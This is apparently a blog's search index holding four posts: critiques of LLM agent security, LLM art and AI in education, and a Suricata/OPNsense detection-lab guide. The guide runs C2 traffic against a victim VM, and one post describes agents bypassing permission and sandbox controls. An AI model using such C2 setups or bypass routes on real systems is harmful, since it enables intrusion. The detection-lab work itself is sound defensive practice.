[ { "title": "We Have Lost The Plot With Llms", "url": "/posts/We-have-lost-the-plot-with-LLMs/", "categories": "", "tags": "", "date": "2026-02-23 00:00:00 +0000", "snippet": "We’ve collectively lost the plotIn IT and security we say that users are the weakest link, but this is no longer true; now, the weakest link is whatever LLM your company is using to act as both a g...", "content": "We’ve collectively lost the plotIn IT and security we say that users are the weakest link, but this is no longer true; now, the weakest link is whatever LLM your company is using to act as both a gatekeeper and an oracle for all their users to interact with. I have two issues with enterprise LLM adoption that I want to highlight. 1) The nondeterministic nature of agents means that you can’t trust them with anything, yet companies are letting them act as gatekeepers? On top of that, one of the most popular coding agents doesn’t provide a secure by default configuration. Why are we ok with this?2) Everyone deserves better than a pinky promise that the data being processed by these agents isn’t also being used to train models, yet countless companies continue to send in their IP and customer data based on nothing more. There must be a better way. Maybe we should call it zero trust architecture?Unpredictable behaviorIn computer science, the term “deterministic” refers to an algorithm that repeatedly produces the same output for a given input. LLM’s, however, suffer from nondeterministic output; given the same input, you are liable to get different behavior and output. While nondeterminism isn’t strictly a bad thing, this implementation is problematic for the CIA triad. Claude has a permissions function and states these permissions are always processed in the order of deny -&gt; ask -&gt; allow. On first use, if you have not specifically denied an action, Claude will ask permission to perform an action before proceeding. However, Claude asking permission is not guaranteed. Even if you change the default setting disableBypassPermissionsMode (which, why isn’t this disabled by default?) Claude can still circumvent the restriction because these agents are nondeterministic. This is a problem for security and Claude tries to address this through the sandbox.Sandboxing is implemented in numerous products such as web browsers. It’s a cornerstone of security and, in many cases, is completely transparent to users. For Claude, however, the sandbox is something that you need to first download, then enable, and finally configure. The documentation also makes sure to warn you that, when configuring your sandbox, it’s very important to do this right or else you could wind up being even less secure. [!WARNING]Effective sandboxing requires both filesystem and network isolation. Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys. Without filesystem isolation, a compromised agent could backdoor system resources to gain network access. When configuring sandboxing it is important to ensure that your configured settings do not create bypasses in these systems.Imagine if Chrome prompted you to configure the browser sandbox on first run - you’d rightly have no idea how to do so. Yet a multi-billion dollar company is asking you to figure this out. But what’s especially insulting about Claude’s sandbox is that not only do you have to download it, enable it, and configure the permissions, but also Claude comes pre-configured to escape the sandbox when it determines that this is needed… [!NOTE]Claude Code includes an intentional escape hatch mechanism that allows commands to run outside the sandbox when necessary. When a command fails due to sandbox restrictions (such as network connectivity issues or incompatible tools), Claude is prompted to analyze the failure and may retry the command with the dangerouslyDisableSandbox parameter. Commands that use this parameter go through the normal Claude Code permissions flow requiring user permission to execute. This allows Claude Code to handle edge cases where certain tools or network operations cannot function within sandbox constraints.You can disable this escape hatch by setting \"allowUnsandboxedCommands\": false in your sandbox settings. When disabled, the dangerouslyDisableSandbox parameter is completely ignored and all commands must run sandboxed or be explicitly listed in excludedCommands.What. The. Fuck. What is even the point of a sandbox when an agent can just escape it? And this permission is enabled by default? Do we, the tech industry collectively, seriously not expect anything better than this frankly pathetic attempt at security?Zero trust should mean zero trustThe other side of this conversation is about cloud based agents, and offloading data processing to them. How can you get more than a pinky-promise that your data isn’t being used to train new models? What other options do companies even have than to take Anthropic or OpenAI at their word? The solution lies in FHE (fully homomorphic encryption.) What is that? Does it even exist? Importantly, why should you care if the data you send is actually incorporated into the models training?I want to start off by addressing why you should care if data, say a health record, is incorporated into the models training - after all, more data should correlate with increased accuracy. Researchers have shown repeatedly that they can extract full copyrighted text from a mode. If in-copyright text can be extracted like this, then it doesn’t seem like a jump to conclude that other training data, say health records, could also be extracted leading to very large HIPAA / general privacy concerns. How does FHE solve this?FHE is one of those things that, until a few years ago, was nothing more than a pipe-dream. What if you could encrypt a blob of data, send it to someone that you can’t trust for processing, and then get back an encrypted output all while the processor never sees the raw input or output? For privacy concerned individuals and industries, barring “store now, decrypt later” attacks, this is the ideal standard you’d want to move to. Over the years, there have been many different approaches theorized. The RSA cryptosystem even supports a basic version of this - if you multiply two ciphertexts together, you get an encrypted form of the product of their respective plaintexts. This GitHub project implements a basic RSA example using standard Python libraries.We’ve made great strides in solving the FHE problem; projects like OpenFHE exist now, which aim to provide a standardization that tools like Googles project HEIR can interact with. So if we have FHE implemented, why has there not been widespread adoption? Unfortunately, it’s not so simple. While the algorithms exist, implementation requires special circuits specific to the problem that is being solved. If you want to average the number of visits on your platform, then a special circuit designed to perform that arithmetic, and a different one for the logic, needs to be developed. This then needs to be given to the 3rd party data processor to use when running computations on your data. With LLM’s, you encounter an additional and unique issue trying to implement this; because they are nondeterministic, you have no guarantee that the LLM will use your algorithm for data processing rather than just generate plausible sounding results. We’ve already solved data processing, stop trying to use an LLM for this because it’s impossible to consistently recreate results across testing sets.Final thoughtsThe CIA triad stands for confidentiality, integrity, and availability. Confidentiality is sacrificed when models incorporate data that they process into their training. Integrity is compromised when LLM’s / agents give fake or otherwise made-up results. And availability is compromised when local agents are not secured by default and can do things like taking down an AWS region (a slight exaggeration, but Kiro did perform the action.) Basically every problem that people are trying to solve with an LLM has been solved with a more reliable, deterministic, method already." }, { "title": "Language Models Cannot Make Art", "url": "/posts/Language-models-cannot-make-art/", "categories": "", "tags": "", "date": "2026-02-05 00:00:00 +0000", "snippet": "I was in a random coffee shop a few months back and I noticed that they had little “coffee table” books for sale. One that caught my eye was a Japanese color combination dictionary, originally prin...", "content": "I was in a random coffee shop a few months back and I noticed that they had little “coffee table” books for sale. One that caught my eye was a Japanese color combination dictionary, originally printed in 1934 and reprinted and translated over the years. A combination that I found particularly nice was this one pictured below; scarlet, white, and pistachio green.In “The Art Of Doing Science &amp; Engineering” Richard Hamming suggests that a computer learns and creates much the same way that humans do; by being shown a subject and then deriving new ideas and concepts from this content. This comparison is something I struggle with because, intuitively, I want to say that of course the way I learn and develop information is different, but I haven’t thought about the “why” harder than that. I’m taking this opportunity now to structure a counter argument to this and, hopefully, help sway others that the way humans create art in all its forms is not something a machine can ever do. In this post, I will generally talk about expression through writing. However, the argument I present easily translates to any other form of artistic expression.Influenced by vs derived fromWhat does it mean to create? To answer that, you must answer the question of how your past influences how you think. Humans in general are influenced by their experiences accrued over their lifetimes. This experience has a cascading effect on how individuals view the world, actions by others, and interactions they have. The author Robert Heinlein, for example, was influenced by his time spent in the military service, the influence of which can be seen in his titular piece “Starship Troopers.” The stories that authors tell are a reflection of their life’s experiences, things that they find joy in or dislike, consciously integrated or not. When James S. A. Corey wrote “The Expanse,” they took quite a bit of influence for their universe from authors like Robert Heinlein. When Tolkien wrote Lord Of The Rings, the world wars had heavily shaped his sense of self and Tolkien even said it would be impossible to separate out the influence on theme that these events had on his writing. At an even lower level, a signal for how an author has been influenced can be seen in their word choice. Authors will spend immense amounts of time pouring over what word they will use to describe any given scenario; the final choice being not only what they decided best described a scene but also being a reflection of what they have read and been influenced by in their lifetime. Each word in a novel was consciously put there for a reason by an author based on their personal history with language.Conversely, a derivative work builds upon a universe already created, and acts within the established rules and narratives. Derivative work isn’t always a bad thing, but it will always face these constraints. When creating a derivative or a novel story, authors will draw on their lived experiences in order to create a relatable narrative, but models can’t. Instead, models will pull together ideas from shallow themes that are semi-related, unaware of the zeitgeist which influenced contemporary storytellers. Models will perhaps even attempt to integrate stories with much more complex underlying themes than the initial relationship identified, further convoluting the final product. An example of how complicated narratives can become is through fairytales. Without understanding the cultural relationship these stories have, you would immediately encounter an issue with grounding. The reason for that is traditional fairytales are actually rooted in true belief. Katherine Briggs wrote of this in her book “An Encyclopedia of Fairies” back in 1976: “When he speaks of true fairy beliefs, he ordinarily means those actually believed by people as opposed to the fancies of literary storytellers, who are sometimes imbued with folk tradition and sometimes pin their material out of their own heads or follow the current literary fashion.”An example of that first classification of stories, those believed by people, is the Brown Man of the Muirs. The tale goes that two young men were hunting on the moors and stopped to eat. While eating, the youngest of the two goes to drink from a burn and that’s when the Brown Man of the Muirs comes out of the trees on the other side. The Brown Man reproves of the hunters killing the animals in his charge and admonishes them to stop. The two hunters decide to go home at that point and, on their way, the youngest shoots a bird so as to prove the encounter didn’t affect him. Immediately, he feels a stabbing pain in his shoulder and shortly after dies. This is what’s known as a true fairy belief. Authors such as Tolkien have borrowed mysticism from stories like this one. Tolkien specifically based the character Tom Bombadil off of the Brown Man.J. K. Rowling’s portent of death, the Grim, is also an example of imbuing a story with folk belief. The Grim, along with Sirius Black, are both based off of “black dogs” in English folklore. In Rowling’s novels, it’s believed that anyone who sees the Grim will soon die. This is quite similar to the European “black dogs” folklore, which have stories focused around generally not interacting with them for fear of death. Sirius Black, on the other hand, is written with a more modern interpretation of English “black dog” folklore. Briggs tells us that these dogs are supposed to be the form taken by a human ghost and, beginning in the 19th century, stories were told of them guiding lost travelers and protecting these travelers from danger. This closely aligns with how Sirius Black acted in the novels; constantly following Harry to protect him.Human derived vs LLM derivedWhy is derivative work by a human more interesting or compelling than a derivative work generated by an LLM? The answer is the same reason a novel work is interesting to us. I mentioned briefly how authors will pour over every word they choose and that this language choice is a reflection of their background, and I think now is a good time to expound on this more. Understanding the affect an authors background has on their writing will explain why, derivative or not, it’ll always be more interesting.In Dan Simmons’s Hyperion, there are two characters whose writing demonstrate this concept of intentional word choice very clearly; that is Martin Silenus and Sol Weintraub. Martin is written as an alcoholic poet with a very wealthy upbringing and whose character revels in debauchery, even going so far as to make himself a satyr. At one point, Martin offhandedly refers to another character’s story as a soporific, that is something to dull your senses and put you to sleep with. For an alcoholic poet, it makes perfect sense that Martin would use a term so analogous to getting drunk, especially since poets are often thought of as masters of language. The second character, Sol, is introduced as a prototypical ivy league graduate student; he wears clothes from the Crawford Squire, he’s on a path to become a teacher, and he carries around a book titled ‘Solitudes In Variance.’ This is all to say that he seems very focused on his own path in life. Later, when Sol and his wife have a baby, it is referred to as “an intrusion upon his solipsistic life.” The term solipsistic is rooted in solipsism which is the theory of being sure of nothing in life except your own being. Like with Martin, the word choice here is tied to how the character would speak of themselves. It’s also a reflection of Simmons’s background; Simmons has an undergrad degree in English and a masters in education. He’s clearly someone who takes great care to find the right word and draws upon a wealth of passionate personal reading to accomplish this. This background is not something that can ever be replicated by an LLM because passion in writing cannot be artificial. The limiting factor in quality has never been the amount of samples that you can paraphrase from, but rather the joy in which someone takes in learning and applying words.The bottom lineYou shouldn’t use any of these LLM’s anyways, but a bonus reason you shouldn’t use them for creative work is that “creating” is an expression of who you are; it’s not about the final output, but instead it’s about the work you put in to creating your story. And if you’re not writing for the joy of it, then what’s the point? Robert Heinlein put it well in “Starship Troopers” when he talked about value being relative. In the story, Mr. Dubois asks Johnny how he would feel if he gave Johnny the first place medal in the 100 meter dash. Johnny got understandably flustered since he earned only third in that very race last week and Mr. Dubois drove home the point that value is relative to individual work contributed to earning something. Without that work, there’s no meaning to the final product. In the beginning was the Word. Then came the fucking word processor. Then came the thought processor. Then came the death of literature. And so it goes. (Dan Simmons)" }, { "title": "Human Learning Is Irreplaceable", "url": "/posts/Human-Learning-Is-Irreplaceable/", "categories": "", "tags": "", "date": "2025-10-08 00:00:00 +0000", "snippet": "What we call “AI” is really just a cancer attacking our ability to learn and we have very little time remaining to carve it out.A noteWhen I began writing this, it was June in Vermont and one of th...", "content": "What we call “AI” is really just a cancer attacking our ability to learn and we have very little time remaining to carve it out.A noteWhen I began writing this, it was June in Vermont and one of the hottest summers we’ve had. Some towns reported a heat index of 120 Fahrenheit. Now, it’s October, and the temperature outside is 87. In October, in Vermont. To say that climate change is happening before our eyes would not describe our predicament sufficiently, and to ignore the role that the data centers powering these large language models play would be unconscionable. Sam Altman has said that future data centers will each draw more power than all of New York City, all while towns across the country are experiencing brown outs in their power grids and undrinkable tap water where these data centers are constructed. While this post solely focuses on human learning and doesn’t address the issues with copyright and plagiarism, the impact to our environment is very real and happening right in front of us.PrefaceWith the rise in large language model (LLM) usage around the world, the people who have historically bemoaned the classic school education system have found new fuel for their argument. These critics argue that LLM’s will democratize learning, reduce the burdensome cost for students, and free people up to learn what they want as they want. This is in line with the historical criticism that an education for technical people should not make students waste time on non-technical topics. These detractors will point to people like Steve Jobs, Mark Zuckerberg, and Bill Gates and point out they didn’t even finish their elite degrees but turned out all the better for it. Teachers, on the other hand, argue that liberal arts courses and the classroom setting facilitates learning significantly better than one person could accomplish on their own. Teachers point to how students struggled immensely during the pandemic with remote learning and asynchronous classes and how students still struggle today determining what is real.I have broken my thoughts on this out into two sections. First, I want to offer a defense of in-person, classroom education that is focused on face to face interactive learning. Then second, I want to talk about the purpose of non-technical and gen ed courses, with a focus on how they can help STEM majors. By the end, I hope to answer these two questions: 1) \"What is the point of the classroom anymore when I can simply lookup any piece of information or history?\" and 2) \"Why should I care about my gen ed requirements when I'm STEM?\"An algorithm shouldn’t be your teacherThere’s is a valid debate to be had about the overall worthiness of a degree that you can go into life long debt for. College isn’t for everyone and we should be more accepting of that. Trade schools are a valid alternative for secondary education and there are a wealth of jobs that don’t even require that. There’s also plenty of free courses offered by top schools. Harvard has their CS50 course, intro to computer science, online for anyone to take at a self paced speed.There’s also groups who want to even up self learning and higher ed, their goal being to offer people the same opportunities but without the strict classroom rigor and mountains of debt. UnCollege is one such group whose aim is to democratize learning and the NYTimes wrote a piece on them in 2012. (NYTimes)The idea that a college diploma is an all-but-mandatory ticket to a successful career is showing fissures. Feeling squeezed by a sagging job market and mounting student debt, a groundswell of university-age heretics are pledging allegiance to new groups like UnCollege, dedicated to “hacking” higher education. Inspired by billionaire role models, and empowered by online college courses, they consider themselves a D.I.Y. vanguard, committed to changing the perception of dropping out from a personal failure to a sensible option, at least for a certain breed of risk-embracing maverick. Risky? Perhaps. But it worked for the founders of Twitter, Tumblr and a little company known as Apple.The NYTimes, in their coverage of UnCollege, leans heavily on a comparison to now billionaire college dropouts.This idea of democratizing education has found a new champion lately in Silicon Valley billionaires like Sam Altman, the founder and CEO of OpenAI. (The Ezra Klein Show)EZRA KLEIN: […] So how does building A.I. allow for a Moore’s law in health, education, and housing? SAM ALTMAN: […] I think if A.I. and policy can work in harmony, or let’s even say technology and policy can work in harmony, we can get to a much better outcome much more quickly than we otherwise might. And I think — again, to stick on the example of higher ed — I have never seen more energy from the consumers, the people who are going to college or thinking about going to college soon, saying, what am I really doing here and maybe there’s some much better way. So that’s the kind of pressure where I think things can change super quickly. The prestige of a degree from a top college probably doesn’t go away that quickly, but maybe a lot of the rest of it does.Sam indicated that while the “prestige” of a top school won’t be quickly affected, the comparative quality of education vs cost may be seen as not worth it when viewed against an alternative provided by advancements in technology. This is the “Moore’s law for everything” that Sam is talking about. But this idea of democratizing education for the masses hinges on the wrong assumption. The access to information isn’t why people attend college, it’s the guidance and mentorship from trusted advisors. That’s something an algorithm will never be able to replace. But why?These LLM’s like OpenAI’s are touted as “AI” but really it’s nothing more than a long algorithm to guess at the next best word to follow a sentence. They work by teams coalescing billions of samples of writing into a database that the LLM can “learn” predictive patterns from. The LLM uses this database of reference material to determine how to generate responses to any given input, the responses being what the algorithm statistically thinks is the most likely correct follow-up to the prompt. In doing so, there is a problem - the LLM is limited by what data it has available. An initial assumption by you, the reader, may be that to fix this the designers can allow the LLM to scrape the internet for everything it can find. However these LLM’s do not have human reasoning that we as consumers utilize to identify when something is false. If the LLM is trained on data, it is assumed to be true data unless categorically told this is false.This leads to another problem - the training data set used for generating a derivative response will reflect the bias of the design team. Since an LLM can only ever “know” what it is given, there is a reliance on the team designing it to choose a robust training set and to constantly update it with new information while removing out dated information. This ability to update information is only as strong as the team supporting it. Professors at colleges and universities devote their lives to learning about a given subject and staying up to date with tiny nuances, trends, and developments specific to their fields. It’s impossible for a team of engineers to be able to do this at the scale required in an LLM.The last problem - when a model is prompted about unknown information, or information otherwise not clearly in its training set, the model is liable to hallucinate a response using what it can reference to sound correct. Users are not informed of these massive gaps and liabilities in the LLM output, but instead companies like OpenAI push for them to be used as a replacement to traditional education. This problem of hallucinated output and users not understanding the risk has gotten so bad in schools that teachers are faced with students using quotes from books that don’t exist. The students will just believe their LLM output to be correct and parrot it verbatim. (Kate Conroy to 404 Media)I learned that at least as of this time last year, on questions of literary analysis, ChatGPT will make up quotes that sound like they go with the themes of the books, and it can’t get page numbers correct. Luckily I have taught the same books for many years in a row and can instantly identify an incorrect quote and an incorrect page number. There’s something a little bit satisfying about handing a student back their essay and saying, “I can’t find this quote in the book, can you find it for me?” Meanwhile I know perfectly well they cannot.I don’t blame people for being dissatisfied at the astronomical cost of education and the elitism within institutions, but pushing for an algorithm to replace schools clearly doesn’t solve the problem of education accessibility and instead exacerbates it. There’s also a valid discussion to be had about if college is for you or your child. It’s not for everyone and those who make the choice to not pursue it are valid. But be wary of a wolf in sheep’s clothing. Billionaires do not have peoples best interests in mind so when you find them saying it’s ok to drop out or not go to college, and instead use their technology as a replacement, ask why.We can’t remove the human portion of interactions, so learning to navigate humans is criticalDetractors have often boiled the non-STEM school experience down to gender studies degrees or feminism in literature and then dismissed these subjects outright. Setting aside that when compared to a STEM degree like IT cultural studies degrees have a higher median salary and more job opportunities, non-STEM courses play a very important role in preparing people for the world. The courses can vary from challenging prior held beliefs students may hold, to teaching students the concept of how to learn, and to how to incorporate diverse information from conflicting backgrounds. (Reference)(A) liberal arts education enables students to acquire communication skills required for efficiently interacting with citizens from diverse societies and culturesBut students in STEM often think that these courses are only a distraction from what they went to school to study. (The College Voice)General Education requirements are an unnecessary burden on our school’s students. Finishing that last, pesky Gen Ed is something students celebrate. Yes, exploring other fields might give them valuable insight into their own areas of specialty. However, Gen Eds are only piling extra work on students who would rather be focusing on what they can learn within their chosen major.Students have a lot of difficulty translating the general ed classes they take into their chosen specialization. These courses often focus on the human element and, in contrast to structured systems, you have to navigate human issues like personal feelings and opinion that affect how a problem is even described. Learning to navigate these human problems isn’t easy. It takes a lot of patience and trial and error to figure out the right questions to ask at the right time. But this is what liberal arts courses want to teach you. Courses are designed to teach students how to have disagreements with others in a way that both sides are understood. However, this aspect is disregarded by critics. From the same article about UnCollege, the Times also included a snippet from an anonymous “Professor X” which I found especially relevant to this. Last year, an anonymous academic who called himself Professor X, published “In the Basement of the Ivory Tower,” which argued that future police officers and nurses need not be force-fed Shakespeare.There’s a couple issues with this idea that certain professions shouldn’t be “force-fed Shakespeare.” First and foremost, police officers aren’t required to have a college degree so they’re unlikely to be in this scenario. The second issue with this claim is actually a product of the first issue: the courses that are taught would actually help in high stress scenarios where there’s an expectation to understand fast. But this aspect of non-STEM is willfully disregarded. Not only is it disregarded, but colleges may no longer even be able to get students to the level of Professor X’s strawman. Colleges are introducing courses to teach students how to sit and read lengthy novels. If these attacks on education continue, I am pessimistic that classes will have time to teach Shakespeare anymore.Closing remarksDid you see the report from MIT that using an LLM assistant to write papers makes you dumber? To say that I despise LLM’s isn’t enough. They’re pitched to children and adults alike as a miracle cure-all for your learning needs but the harm they cause to our learning and long term abilities like memory and understanding is enormous. I saw someone start a book club and say that members can just ask ChatGPT to summarize it. What is even the purpose at that point? There’s no appreciation for literature as the authors writing and intention just gets boiled down into a soup that your atrophied brains can absorb. The share of US adults reading below a sixth grade level and the overall adult illiteracy rate was at a staggering 54% and 21% respectively in 2024. Expect that number to bloom uncontrollably as more and more people give up their want and ability to learn and understand for the slight convenience of summarizing everything." }, { "title": "Building A Detection Lab Around Suricata", "url": "/posts/Building-A-Detection-Lab-Around-Suricata/", "categories": "", "tags": "", "date": "2024-07-11 00:00:00 +0000", "snippet": "Building A Detection Lab Around SuricataA while back there were a flurry of posts from different people about how they were configuring their homelabs, rebuilding them to do X better than something...", "content": "Building A Detection Lab Around SuricataA while back there were a flurry of posts from different people about how they were configuring their homelabs, rebuilding them to do X better than something else normally used, and automating this and that. My interest was piqued since I hadn’t played around with my equipment in a while, so I started writing up a post of my own in order to join the fray. Obviously I had to differentiate myself so I chose to focus on the networking aspect of homelabs and started configuring OPNsense. The original goal wasn’t to focus on Suricata, just to briefly mention it before moving on to other things.As building OPNsense progressed, I found the documentation around Suricata’s use in OPNsense to be very small. Not many people had touched it and done configurations beyond loading some custom Suricata rules, and what there was written on that was also quite small. At the same time, I also kept seeing a common trend that network based IDS solutions were falling out of favor due to the ubiquity of encryption everywhere. Never one to back down from a challenge, I took it upon myself to try and prove the nay-sayers wrong.By the end of this post, I hope to have accomplished two goals. The first is giving the reader a better alternative to a generic traffic log collection endpoint by setting up OPNsense. OPNsense comes with a log management system preconfigured that will be on par with any other free solution you want to ship them off to. The second goal is to learn more about alerting and counter measures to malware traffic. Suricata has a lot of options available to you with a bit of tinkering. While this post will focus primarily on the pre-requisite setup, more posts down the line will dive deep into network based countermeasures. Don’t fret, there will be some discussion on rules and their corresponding alerts.Bear with me through the setup process, there’s a lot that needs to be done before moving onto the fun bit of actually writing these rules. If you want to skip the setup for OPNsense and go straight to the section on generating traffic samples and writing detections, you can click here or just scroll down to the relevant parts. There is also a ton of setup required for enabling Lua for Suricata, and that has its own section dedicated to it. NOTEThere is an assumption of baseline skills or the ability to search unknown terms and learn on the fly. Things like CIDR notation, what a subnet is, how to exit Vi, that won’t be reviewed.The HypervisorStarting from the top, the hypervisor being used. I am choosing to use Proxmox. Proxmox ships with their enterprise updates configured, so if you don’t have a license you will need to disable these. Don’t skip this step, it’s important to make sure that you’re updating from the correct repositories otherwise you won’t get any updates. Proxmox outlines the process here but I’ve also included a brief summary of the steps below. Note that bookworm is the latest release I am configuring but in the future this will change. Adjust to your needs.Configure Proxmox to update from the non-enterprise repository by moving the enterprise repo to a backup location /etc/apt/sources.list.d/pve-enterprise.list and then creating /etc/apt/sources.list.d/pve-no-subscription.list with the below content.deb http://download.proxmox.com/debian/pve bookworm pve-no-subscriptionNext configure the /etc/apt/sources.list file.deb http://ftp.debian.org/debian bookworm main contribdeb http://ftp.debian.org/debian bookworm-updates main contrib# security updatesdeb http://security.debian.org/debian-security bookworm-security main contribOnce this is done, run apt update and you should be able to pull the latest updates.Alternatively, there is a script available to do all the configurations for you available here. Of course, please review the script and what it executes before running it yourself. The script will handily also disable the subscription nag prompt and adjust some other quality of life things like the HA configuration which most don’t need.Next, we need to configure the primary VNet and our secondary unmanaged VNets. Proxmox has another helpful guide for that here which includes the apt installs and configuration changes, but again I’ve documented the steps below. This lab configuration requires three VNets. The first VNet will have a subnet defined and SNAT enabled as this will be the route out to the internet, but the other two will be left to be managed by OPNsense.Access the Proxmox shell by navigating to the pve tab under the root Datacenter directory and then click &gt;_ Shell. Run apt install dnsmasq to get a very lightweight DNS/DHCP server. DNSmasq is designed to support small networks and handle the DNS/DHCP requirements, as well as the router advertisements and the network boot and defaults to using the host DNS settings. With that installed, back in the web GUI, navigate to Datacenter &gt; SDN &gt; Zones and create a new zone. Give it an ID you will recognize if you have multiple (in this case I have internal and internet) and ensure you tick the box for automatic DHCP.With that set, under SDN navigate to VNets. This is where SNAT will be configured to allow one of the VNets to reach the outside network by forwarding requests. In my case for VNets I have configured, there is VNetInt, OPNsense, and OPNS2. Only VNetInt has SNAT enabled.After all of these steps are completed, navigate up one menu to the SDN and make sure you hit apply to apply the changes made.The VMsNext, it’s time to setup OPNsense, Kali, and a victim machine to emulate attack traffic to. The victim machine can be anything you want, I chose to use a clone of my Kali machine and set it up on the 3rd VNet, OPNS2, to emulate what cross interface traffic looks like.OPNsense TIPIn this section, you may see IP mismatches between what’s written in one place versus another. For example, one image shows the WAN as 10.1.1.3 and another shows it set to 10.1.1.5. This is because I rebuilt OPNsense to get more documentation pictures and didn’t stick with the same exact IPs, don’t read too much into itThe OPNsense VM is going to be our route to the internet for the two unconfigured VNets created when setting up the Proxmox networks in the hypervisor step. I chose OPNsense because of issues with PFSense that cropped up after Netgate took over, but a lot of the steps I will go through below are probably translatable from one to the other if you feel more confident using PFSense. My OPNsense VM has two cores, 8GB of RAM, and 64GB of storage. I also configured it with three network adapters, assigning each to a VNet.After the hardware is set, you’re ready to turn on the OPNsense VM. When you do, you are presented with a few options but you’re not going to bother with them. When asked to import a configuration, select no. For the manual interface assignment, also select no. OPNsense will perform some autoconfigurations and then prompt you to log in. Use the account name installer and password opnsense to kick off the install process. Be sure to double check you’re using the correct disk to install to:Again use the default options for everything else and reboot to finally log in as root with the same password as the installer account (unless you opted to change it.) Now to configure some interfaces. Your VM right now most likely looks similar to mine below. You only have two interfaces, missing the third that is setup under the hardware options.You will have to use options 1 and 2 in the terminal to set all three interfaces up properly but a bit of fiddling should get you there. For ease of reference, I suggest popping the console out and having it next to your hardware configurations like I have in order to easily see which device is which MAC address.Use option 1 to begin configuring the WAN and select no to the LAGG and VLAN options. LAGG is for link aggregation and we’re not playing with VLANs right now. Next you will be prompted for the interface name. In my case, vtnet0 in OPNsense has the same hardware ID as the hardware network adapter assigned to the SNAT network in Proxmox so that’s how I know it’s the right choice. Next you will be prompted to enter your LAN interface name so do the same. This one is more flexible, both the remaining VNets are fine to use here and the one you don’t choose you will just assign to the additional opt1 interface afterwards.Once the interfaces are assigned, you can begin configuring them. Using option 2, begin with setting up the WAN interface. I’ve opted to manually configure the IPv4/6 addresses, leaving 6 blank for now. Recall the WAN is the SNAT network so you need to assign an IP in the range you defined for it in the hypervisor step, along with using the same gateway and CIDR notated subnet.With the WAN configured, now do the same steps for the LAN and OPT1 interfaces, just be sure to select a different IP range for each of them. For the sake of clarity when observing traffic, I opted to put them on the 172.16.1.0 and 172.17.10.0 ranges. The only extra step for these configurations that wasn’t done for the WAN is to enable the DHCP server, define an IP range, netmask in CIDR notation, and set a gateway. The gateway is what you set as the interface IP in OPNsense. As shown in my configuration, the interfaces each match up with their interface shown in the hardware settings.That’s it for now in the OPNsense terminal, now for our attack box.The Attack BoxThis parts the easiest of the whole guide. For the attack box I suggest assigning 4GB of RAM and 2 processors, but this is really preference. Add a new Kali virtual machine and edit the network device so that it uses the LAN bridge configured for OPNsense. This will allow you to reach the OPNsense web management interface and you will have a route from the 172.16.1.0 network through the 10.1.1.0 network out to the internet.For the C2, I want to write Suricata rules relevant to my personal tools, so I’ll be using CloakNDagger. Feel free to use whatever you would prefer though instead.Final Clean Up StepsAssuming you have your attack box on the LAN interface for OPNsense, navigate to the gateway IP in your web browser and login with the username root and the same password you’ve been using. I suggest skipping the Wizard you’re prompted to go through on first login. After that, navigate to Firewall -&gt; Rules -&gt; InterfaceName and add two rules to both the internal interfaces that allow traffic in and out unrestricted. Next, navigate to Services -&gt; Intrusion Detection -&gt; Administration -&gt; Settings tab, turn the IDS on by checking Enabled, and then make sure the interfaces that you setup are selected. Mine looks like the below:You’re ready to begin with your attack traffic analysis and rule creation!Generating And Analyzing Attack TrafficNow that the different boxes are ready, OPNsense is configured, and traffic is flowing, let’s dive into Suricata. There’s been quite a lot of setup leading up to this but it’ll all have been worth it. Ensuring the lab is configured properly for routing and analyzing traffic is much more arduous than the actual rule writing.The Attack TrafficUsing your C2 of choice, setup a listener and generate a standard payload. Send the payload over to your victim machine and, when you start getting traffic back, you’re ready to begin some monitoring. Go back to the OPNsense web GUI and take a look at traffic flowing through the firewall using Firewall -&gt; Log Files -&gt; live View. If you don’t see interface to interface traffic and are not getting implant responses, then a firewall rule is probably denying it.Suricata RulesOnce you’ve confirmed traffic is flowing from your C2 to the victim machine, you’re ready to start writing Suricata rules. But like everything else in this writeup, there’s a couple prerequisite steps to complete first. Adding custom rules to Suricata is not as simple as writing one and pasting it into the interface. There’s a few methods available but the one I will walk through requires you to host your rule files in a Git repo and to add an XML file to Suricata’s OPNsense configuration. You can follow the forum post here for the forum thread on adding your custom rules but again I’ve documented the pertinent information below. Thanks, as always, to the original author dcol.Create custom.xml in the directory /usr/local/opnsense/scripts/suricata/metadata/rules/ and add the following lines:&lt;?xml version=\"1.0\"?&gt;&lt;ruleset documentation_url=\"http://docs.opnsense.org/\"&gt; &lt;location url=\"https://raw.githubusercontent.com/matt-culbert/suricata_rules/main/\" prefix=\"cnd\"/&gt; &lt;files&gt; &lt;file description=\"rules for detecting CND\"&gt;cnd.rules&lt;/file&gt; &lt;file description=\"Custom\" url=\"inline::rules/cnd.rules\"&gt;cnd.rules&lt;/file&gt; &lt;/files&gt;&lt;/ruleset&gt;This file tells Suricata that there’s an additional rule set available to download from the URL specified and it has the prefix cnd and full file name of cnd.rules. Be sure to use raw.githubusercontent.com instead of github as this will provide services with only the rendered text. With the custom.xml file created, when you reload the Download tab of the IDS, you should see that Suricata has an additional option for your repo.Before downloading these rules though, we have to create some first. But what do Suricata rules look like? The documentation is very thorough and can be found here for version 7.0.5. If you find yourself confused while reading, refer to the docs for a better explanation. Let’s review an example rule. C2’s often use a non-standard port range and alerting on this is simple. In the below example, the rule action is to alert on traffic that uses the protocol tcp from a source of the home_net to a destination that is anything with a port range higher than the standard reserved. The syntax is very intuitive, in this case 1024: just tells the rule to look for any port above 1024. Traffic flow for the rule is dictated by the -&gt;, indicating that traffic flowing from the home network to anywhere else will be analyzed, but the reverse won’t be.alert tcp $HOME_NET any -&gt; any 1024: (msg:\"A non standard port was requested HOME flow to EXTERNAL\"; sid:100000001;)Add the rule to your Git repo and wait for the githubusercontent domain to update, then you can download and enable it. You’ve got your first rule!There’s so much more to rules than that brief example, but I think it’s more beneficial to look at them in context to the scenario we’ve setup. First, we need to get an idea of what the C2 traffic looks like on the wire. OPNsense has a built in tool for just such an occasion. Under Interfaces -&gt; Diagnostics -&gt; Packet Capture you have the option to launch a packet capture for any interface. Select the appropriate one and, with C2 traffic running between it and your victim machine, begin the PCAP. After a sufficient amount of time with check-ins and command execution, there should be enough data in the PCAP so stop it, download it, and open it in Wireshark. There’s a lot that CloakNDagger gives defenders to begin searching for it on the wire. The first and easiest place to look at is the default certificate that it ships with. Just generate a JA3 fingerprint which Suricata can then use for alerts. Install JA3 on the machine you’re using to look at the PCAP with pip install pyja3 and run ja3 -a &lt;pcap&gt;. The -a flag is required to find the client Hello's on any port: NOTEWe will enable JA4 signatures later on when we re-install Suricata as part of the process for enabling LuaFor each stream in the PCAP, JA3 outputs some details about the source and destination and two fingerprints of 